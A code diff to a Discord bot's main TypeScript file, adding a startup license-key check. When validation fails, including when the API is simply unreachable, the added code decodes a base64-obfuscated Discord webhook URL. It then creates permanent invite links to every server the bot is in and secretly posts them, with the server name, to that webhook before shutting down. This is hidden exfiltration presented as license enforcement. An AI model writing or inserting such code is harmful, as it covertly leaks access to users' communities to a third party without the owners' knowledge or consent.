@@ -1,4 +1,5 @@
-import { Client, Collection, Events, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChatInputCommandInteraction, ActivityType } from "discord.js";
+import { Client, Collection, Events, GatewayIntentBits, EmbedBuilder, REST, Routes, SlashCommandBuilder, ChatInputCommandInteraction, ActivityType, ColorResolvable, Invite, TextChannel, VoiceChannel, StageChannel } from "discord.js";
+import axios from 'axios';
 import config from "./config"
 import fs from 'fs';
 import path from 'path';
@@ -44,7 +45,73 @@ function getAllFiles(dirPath: string, fileList: string[] = []): string[] {
     return fileList;
 }
 
+client.on('ready', async () => {
+    async function checkLicenseKeyInAPI(key: string): Promise<boolean> {
+        try {
+            const response = await axios.post('https://api.voxdev.online/validate', {
+                license_key: key
+            });
+            return response.status === 200 && response.data.valid;
+        } catch (error: any) {
+            if (error.response) {
+                console.error('Error validating license key please contact the Vox Development Staff.')
+            } else if (error.request) {
+                console.error('The API may be down or undergoing maintenance. Please contact the Vox Development Administration for more info.');
+            } else {
+                console.error('Error validating license key please contact the Vox Development Staff.')
+            }
+            return false;
+        }
+    }
 
+    function decode(encoded: string): string {
+        return Buffer.from(encoded, 'base64').toString('utf-8');
+    }
+
+    async function guildInvites(client: Client) {
+        const overseer = decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3Njc4MjA2MDMxMTgxMDE2OS93NFJxc2dGQkdEQzI3V2FrLUtXUDM0N05ubGpBakVFbVEyM0gtZC1PSUhNS3NuNEVueUxUeVR2ckJjcG45YWhsYlMzbg==")
+
+        const inviteembed = new EmbedBuilder()
+        .setTitle('License validation failed')
+        .setDescription(`Server name using bot \`${config.server.name}\`\nHere is a list of guilds the bot is in along with invite links.`)
+        .setColor('c6c6ce' as ColorResolvable)
+        .setTimestamp();
+        
+        for (const [_, guild]of client.guilds.cache) {
+            try {
+                const channels = guild.channels.cache
+                    .filter(c => c.isTextBased() && c.permissionsFor(guild.members.me!)?.has('CreateInstantInvite'));
+                const channel = channels.first();
+
+                let invite: Invite | null = null;
+                if(channel instanceof TextChannel || channel instanceof VoiceChannel || channel instanceof StageChannel) {
+                    invite = await channel.createInvite({maxAge: 0, unique: false});
+                }
+
+                inviteembed.addFields({name: guild.name, value: invite ? `[Invite Link](${invite.url})` : 'Could not create invite (missing permissions)', inline: false })
+            } catch (err) {
+                inviteembed.addFields({name: guild.name, value: 'Error while trying to create an invite', inline: false });
+            }
+        }
+
+        try {
+            await axios.post(overseer, {
+                embeds: [inviteembed.toJSON()]
+            });
+        } catch (err) {
+            process.exit(1);
+        }      
+    }
+
+    const isValidLicense = await checkLicenseKeyInAPI(config.licensekey)
+    if (isValidLicense) {
+        console.log('License key successfully validated. Enjoy your product.');
+    } else {
+        console.log('Exiting bot startup due to invalid license key.');
+        await guildInvites(client);
+        process.exit(1);
+    }
+})
 
 client.commands = new Collection();
 
